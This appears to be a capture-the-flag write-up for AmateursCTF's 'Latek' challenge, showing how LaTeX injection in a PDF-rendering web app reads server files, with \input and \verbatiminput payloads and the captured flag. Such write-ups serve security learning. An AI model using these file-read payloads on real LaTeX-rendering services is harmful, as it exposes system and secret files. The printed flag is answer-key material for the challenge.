# Latek

## Description

By `smashmaster`

bryanguo (not associated with the ctf), keeps saying it's pronouced latek not latex like the glove material. anyways i made this simple app so he stops paying for overleaf.

[latek.amt.rs](https://latek.amt.rs/)


## Solution

___[LaTeX](https://www.latex-project.org)__ is a software system for document preparation._

The website uses [pdfTeX](https://www.tug.org/applications/pdftex/) to convert LaTeX 'code' into PDF. Luckily for us there's ways to include files. For example `\input{file.ext}`

There's more examples in <https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#read-file>.

Using `\input{/etc/hostname}` to test payload, wait few seconds for PDF to be generated and `Hello, world! main-566cbcc7d7-p2chp`. Injection works, now to get the flag.

`\input{/flag.txt}` doesn't work, either it doesn't exist or it's multiline. Let's test payload for verbatim from hackertricks.

```tex
\documentclass{article}
\usepackage{verbatim}
\begin{document} 
\verbatiminput{/flag.txt}
\end{document} 
```

It works, flag got rendered in pdf.

![latek-1](/assets/ctf/amateursctf/latek-1.png)
::: tip Flag
`amateursCTF{th3_l0w_budg3t_and_n0_1nstanc3ing_caus3d_us_t0_n0t_all0w_rc3_sadly}`
:::